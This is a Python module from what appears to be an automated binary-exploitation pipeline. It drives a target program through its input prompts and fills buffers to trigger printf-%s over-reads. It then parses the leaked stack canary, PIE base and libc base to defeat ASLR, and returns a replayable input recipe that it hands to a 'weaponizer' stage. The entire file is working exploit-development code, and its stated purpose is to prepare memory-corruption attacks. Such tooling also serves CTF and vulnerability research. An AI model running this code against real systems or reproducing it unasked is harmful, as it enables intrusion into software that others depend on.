"""Interaction model: drive a program through its input prompts to REACH a leak/crash site.

Most hardened targets read several inputs (a name, a size, a menu choice) before the vulnerable
one, and the leak that defeats ASLR is printed only after those prompts. A provocation that writes
its payload as the FIRST byte never gets there. This module drives the program one prompt at a
time -- classifying each prompt (num/idx/str) and answering it benignly -- and injects a leak
payload at one chosen input, so a leak behind a prompt sequence is actually provoked. It reuses the
same prompt classifier and incremental driver the menu crawler uses, and the shared leak classifier.

It is a LEAK-REACHING helper, not a goal solver: the output is a recovered base/canary plus the
exact input `recipe` that produced it, which a weaponizer can replay to reach the leak in-process.
"""
from __future__ import annotations

import re
import selectors
import struct
import subprocess
import time
from pathlib import Path

from .dynamic import sandbox
from .fuzz import menu
from .poc import leak as _leak


def read_sizes(target_bytes: bytes) -> list:
    """Best-effort sequence of read(fd, buf, N) size immediates in the x86-64 image (the `mov
    $imm,%edx` that precedes a `call read@plt`). Lets the driver send exactly N bytes for a fixed
    read so it does not desync, and spot the oversized read whose buffer is the over-readable one.
    Code order, not execution order -- a hint, not ground truth. Empty on failure."""
    import shutil
    try:
        objdump = shutil.which("objdump")
        if not objdump:
            return []
        import tempfile
        with tempfile.NamedTemporaryFile(suffix=".bin") as f:
            f.write(target_bytes)
            f.flush()
            out = subprocess.run([objdump, "-d", f.name], capture_output=True, text=True,
                                 timeout=30).stdout
    except Exception:
        return []
    sizes, pend = [], None
    for ln in out.splitlines():
        m = re.search(r"mov\s+\$0x([0-9a-f]+),%edx", ln)
        if m:
            pend = int(m.group(1), 16)
        elif "call" in ln and "read@plt" in ln and pend is not None:
            sizes.append(pend)
            pend = None
    return sizes


def read_loop_caps(target_bytes: bytes) -> list:
    """Best-effort sequence of CAPACITIES of char-at-a-time input fields: a `read(fd,&c,1)` inside a
    loop bounded by `cmp $CAP,%reg ; jbe/jb` (the classic `for(i=0;i<=CAP;i++){read(0,&c,1); if
    (c=='\\n')break; buf[i]=c;}`). Such a field is read one byte per call, so read_sizes sees only a
    size of 1 and cannot tell the field's real width; the loop bound does. The width lets the driver
    FILL a field exactly (send CAP+1 bytes with no newline so the loop stops at the cap and leaves no
    residue) and -- by filling several adjacent fields -- BRIDGE a printf(\"%s\") over-read past the
    buffer to a saved pointer. Returns caps (loop bound + 1 = bytes the field accepts) in code order;
    empty on failure. A hint, not ground truth."""
    import shutil
    try:
        objdump = shutil.which("objdump")
        if not objdump:
            return []
        import tempfile
        with tempfile.NamedTemporaryFile(suffix=".bin") as f:
            f.write(target_bytes)
            f.flush()
            out = subprocess.run([objdump, "-d", f.name], capture_output=True, text=True,
                                 timeout=30).stdout
    except Exception:
        return []
    lines = out.splitlines()
    read1_at = []                                        # indices of `call read@plt` with size==1
    pend = None
    for i, ln in enumerate(lines):
        m = re.search(r"mov\s+\$0x([0-9a-f]+),%edx", ln)
        if m:
            pend = int(m.group(1), 16)
        elif "call" in ln and "read@plt" in ln:
            if pend == 1:
                read1_at.append(i)
            pend = None
    caps = []
    for idx in read1_at:
        # the loop's upper bound is a `cmp $CAP, <counter>` feeding the loop back-branch a few insns
        # after the read. The counter may be a register OR a memory slot (-0x4(%rbp)), and the branch
        # may be signed (jle/jl) or unsigned (jbe/jb) depending on the counter's type. EXCLUDE je/jne
        # -- that is the `if (c=='\n')` terminator compare, not the bound. An "or-equal" branch
        # (jle/jbe) means i runs 0..CAP inclusive -> CAP+1 bytes; a strict one (jl/jb) -> CAP bytes.
        cap = None
        for j in range(idx, min(idx + 28, len(lines))):
            cm = re.search(r"\bcmp[lqwb]?\s+\$0x([0-9a-f]+),", lines[j])
            if not cm or j + 1 >= len(lines):
                continue
            bm = re.search(r"\b(jbe|jb|jle|jl|jae|ja|jge|jg)\b", lines[j + 1])
            if bm:
                n = int(cm.group(1), 16)
                cap = n + 1 if bm.group(1) in ("jbe", "jle", "jae", "jge") else n
                break
        caps.append(cap if cap is not None else 1)
    return caps


def _spawn(exe: Path, workdir: Path):
    rel = sandbox._relative_interp(str(exe)) if hasattr(sandbox, "_relative_interp") else False
    cmd = sandbox.isolate_prefix(str(workdir), net=False, rw_binds=[str(workdir)],
                                 chdir=(str(workdir) if rel else "")) + [str(exe)]
    return subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT, cwd=str(workdir),
                            preexec_fn=sandbox._rlimits(2048, 20, set_as=True))


# benign answers per classified prompt type
_BENIGN = {"num": b"16\n", "idx": b"0\n", "str": b"lykos\n"}


def _drive(exe, workdir, steps, *, idle=0.2, timeout=8.0):
    """Send `steps` (a list of byte writes) one at a time, draining the prompt between each, and
    return all captured stdout (raw). Keeps a fixed read(N)+prompt loop in sync."""
    p = _spawn(exe, workdir)
    out = b""
    try:
        sel = selectors.DefaultSelector()
        sel.register(p.stdout, selectors.EVENT_READ)
        end = time.monotonic() + timeout
        for w in steps:
            if time.monotonic() >= end:
                break
            o, alive = menu._drain(p, sel, idle=idle, deadline=min(end, time.monotonic() + 1.8))
            out += o.encode("latin1") if isinstance(o, str) else (o or b"")
            if not alive:
                break
            try:
                p.stdin.write(w)
                p.stdin.flush()
            except (BrokenPipeError, OSError):
                break
        o, _ = menu._drain(p, sel, idle=idle, deadline=min(end, time.monotonic() + 2.0))
        out += o.encode("latin1") if isinstance(o, str) else (o or b"")
    finally:
        try:
            p.kill()
        except Exception:                                    # noqa: BLE001
            pass
    return out


def _classify_last(out: bytes) -> str:
    try:
        return menu.classify_prompt(menu._tail_prompt(out.decode("latin1", "ignore")))
    except Exception:                                        # noqa: BLE001
        return "str"


def _bases_from(out: bytes, target_bytes: bytes, libc_data: bytes, fill: bytes) -> dict:
    """Recover canary / pie_base / libc_base from driven output, including the run RIGHT AFTER our
    fill (a printf(\"%s\", buf) over-read): the bytes past the fill are the canary (low byte 0x00,
    so 7 high bytes follow a non-NUL fill) then saved rbp + a return into image/libc."""
    vals = [int(m.group(0), 16) for m in re.finditer(rb"0x[0-9a-fA-F]{6,}", out)]
    vals += _leak._le_pointer_words(out)
    cvals = list(vals) + _leak._le_canary_words(out)
    # %s-truncated over-read: reconstruct words from the bytes immediately after our fill marker.
    m = re.search(re.escape(fill[:16]) + rb"+", out) if fill else None
    canary = None
    canary_pos = None
    if m:
        tail = out[m.end(): m.end() + 32]
        # canary = 0x00 || next 7 non-NUL bytes (its own low byte is NUL and not printed). GUARD:
        # a real canary is high-entropy random, so reject a run that is mostly PRINTABLE ASCII
        # (that is summary text, not a canary -- it was a false positive otherwise).
        if len(tail) >= 7 and all(b != 0 for b in tail[:7]):
            seven = tail[:7]
            printable = sum(1 for b in seven if 0x20 <= b < 0x7f)
            if printable <= 2 and len(set(seven)) >= 4:      # not text, enough entropy
                canary = int.from_bytes(b"\x00" + seven, "little")
                # the canary sits right after the printed fill run, so the run LENGTH is the overflow
                # distance from the buffer start to the canary slot -- a self-derived canary_offset.
                canary_pos = m.end() - m.start()
        for i in range(0, len(tail) - 5):                    # 6-byte LE pointer runs (0x7f/0x55/0x56)
            if tail[i + 5] in (0x7F, 0x55, 0x56):
                vals.append(int.from_bytes(tail[i:i + 6], "little"))
    cls = _leak.classify_leak(vals, target_bytes, libc_data)
    if canary is None:                                       # raw over-read: full canary word present
        from .poc import rop as _rop
        canary = _rop.find_canary(cvals)
        if canary is not None and m:
            import struct as _struct
            at = out.find(_struct.pack("<Q", canary))        # its byte offset from the fill start
            if at >= m.start():
                canary_pos = at - m.start()
    return {"canary": canary, "canary_pos": canary_pos,
            "pie_base": cls.get("pie_base"), "libc_base": cls.get("libc_base")}


def _drive_bridge(exe, workdir, caps, *, timeout, max_steps=12):
    """Drive the prompt sequence FILLING every char-loop field to capacity so a later printf(\"%s\")
    over-read bridges past the buffer. Each str prompt gets `caps[j]` non-NUL bytes with NO newline
    (the read(1) loop stops at its cap, leaving no residue); each num prompt gets a large non-zero
    value (so an adjacent %s does not stop on a zeroed number field). Returns (output, recipe) where
    recipe is the exact writes sent -- a weaponizer replays it to re-reach the leak/overflow."""
    p = _spawn(exe, workdir)
    out = b""
    recipe = []
    ci = 0
    try:
        sel = selectors.DefaultSelector()
        sel.register(p.stdout, selectors.EVENT_READ)
        end = time.monotonic() + timeout
        for _ in range(max_steps):
            if time.monotonic() >= end:
                break
            o, alive = menu._drain(p, sel, idle=0.2, deadline=min(end, time.monotonic() + 2.0))
            out += o.encode("latin1") if isinstance(o, str) else (o or b"")
            if not alive:
                break
            if _classify_last(out) == "num":
                w = b"-1\n"                               # scanf -> 0xff..ff: 8 non-zero bridge bytes
            else:
                # positional cap when loops are inlined (one per field); clamp to the last known cap
                # when a single shared read(1) helper serves every field (all the same width).
                cap = caps[ci] if ci < len(caps) else (caps[-1] if caps else 64)
                ci += 1
                w = b"B" * cap                            # fill to the loop cap, no newline, no residue
            recipe.append(w)
            try:
                p.stdin.write(w)
                p.stdin.flush()
            except (BrokenPipeError, OSError):
                break
        o, _ = menu._drain(p, sel, idle=0.2, deadline=min(end, time.monotonic() + 2.0))
        out += o.encode("latin1") if isinstance(o, str) else (o or b"")
    finally:
        try:
            p.kill()
        except Exception:                                # noqa: BLE001
            pass
    return out, recipe


def _bases_bridge(out: bytes, target_bytes: bytes, libc_data: bytes) -> dict:
    """Recover bases from a BRIDGE over-read where the leak is a lone truncated image pointer. A
    printf(\"%s\") that runs off the buffer prints a saved pointer up to its NUL high bytes, so the
    pointer appears as a 6-byte little-endian run (byte 5 is 0x55/0x56 image or 0x7f libc/stack) that
    _le_pointer_words (8-byte, NUL-terminated) misses. Harvest those runs, then pin the PIE base from
    a SINGLE unambiguous anchor (allow_single) since a %s cannot leak a second pointer past the NUL."""
    from .poc import exploit as _exploit
    vals = list(_leak._le_pointer_words(out))
    for i in range(0, len(out) - 5):                     # 6-byte truncated LE pointer runs
        if out[i + 5] in (0x7F, 0x55, 0x56):
            vals.append(int.from_bytes(out[i:i + 6], "little"))
    cls = _leak.classify_leak(vals, target_bytes, libc_data)
    pie = cls.get("pie_base") or _exploit.recover_pie_base(vals, target_bytes, allow_single=True)
    from .poc import rop as _rop
    canary = _rop.find_canary(vals + _leak._le_canary_words(out))
    return {"canary": canary, "canary_pos": None,
            "pie_base": pie, "libc_base": cls.get("libc_base")}


def drive_to_leak(exe, workdir, target_bytes, libc_data=b"", *, base_argv=(), timeout=8.0,
                  max_steps=8, fills=(64, 96, 128, 200, 264), max_total=40.0) -> dict:
    """Drive the prompt sequence and sweep a non-NUL over-read fill across each input position and
    length, keeping the (position, length) that discloses the most bases via a printf-%s/over-read.

    Returns {canary, pie_base, libc_base, inject_at, fill_len, recipe} where `recipe` is the exact
    list of input writes that reached the leak (benign answers + the winning fill), so a weaponizer
    can replay it in-process. Empty bases when nothing leaked (no reachable oracle)."""
    exe, workdir = Path(exe), Path(workdir)
    best = {"canary": None, "pie_base": None, "libc_base": None, "recipe": None}
    best_score = -1

    # Residue-safe fill sizing. A fill longer than the FIXED read it lands in spills its tail into
    # the pipe; worse, a single leftover byte prematurely satisfies the NEXT read (the overflow),
    # so the program returns and exits before a weaponizer can send its payload. The over-read that
    # discloses the bases is the later write(buf, BIG), which dumps past the buffer regardless of how
    # full it is -- so the fill only has to be present, not oversized. Derive candidate lengths from
    # the program's own read(N) immediates as N-1 (fills the buffer, leaves the read's delimiter room
    # and zero residue) and try the SMALL residue-safe ones first, falling back to the generic sweep
    # when no read sizes are recoverable.
    _reads = sorted({n for n in read_sizes(target_bytes) if 8 <= n <= 4096})
    _safe = [n - 1 for n in _reads]
    _ordered = []
    for n in _safe + list(fills):
        if n > 0 and n not in _ordered:
            _ordered.append(n)
    fills = tuple(_ordered) or tuple(fills)

    def _score(b):
        return sum(1 for k in ("canary", "pie_base", "libc_base") if b.get(k))

    # Bridge pass FIRST when the target reads fields char-at-a-time (read(1) loops): the single-fill
    # sweep below sends a benign short answer to every other field, so a printf("%s") over-read stops
    # at the first zeroed field and never reaches a saved pointer. Filling EVERY field to capacity
    # bridges the over-read past the buffer. Cheap (one process), so try it before the sweep.
    caps = read_loop_caps(target_bytes)
    if caps:
        out, recipe = _drive_bridge(exe, workdir, caps, timeout=timeout)
        bases = _bases_bridge(out, target_bytes, libc_data)
        if bases.get("pie_base") or bases.get("canary") or bases.get("libc_base"):
            best = {**bases, "inject_at": None, "fill_len": None, "recipe": recipe}
            best_score = _score(bases)
            if bases.get("pie_base") or bases.get("libc_base"):
                return best                              # a base defeats ASLR -> good enough to return

    # Total wall-clock budget: the sweep spawns a process per (position, length), so cap it so the
    # pass can never overrun the stage's own deadline.
    deadline = time.monotonic() + max_total
    # Sweep: at step `k`, send a fill of length L; benign elsewhere (type-classified best-effort).
    for k in range(max_steps):
        if time.monotonic() >= deadline:
            break
        for L in fills:
            if time.monotonic() >= deadline:
                break
            fill = b"B" * L + b"\n"
            steps = []
            for i in range(max_steps):
                steps.append(fill if i == k else b"16\n")
            out = _drive(exe, workdir, steps, timeout=timeout)
            if fill[:16] not in out and b"BBBB" not in out:
                continue                                     # our fill never reached an echo/leak
            bases = _bases_from(out, target_bytes, libc_data, fill)
            sc = _score(bases)
            if sc > best_score:
                best_score = sc
                # recipe = the writes UP TO AND INCLUDING the fill: what a weaponizer replays to
                # reach + trigger the leak (the overflow is the next read after this).
                best = {**bases, "inject_at": k, "fill_len": L, "recipe": steps[:k + 1]}
            if bases.get("canary") and (bases.get("pie_base") or bases.get("libc_base")):
                return best                                  # enough to weaponize
    return best
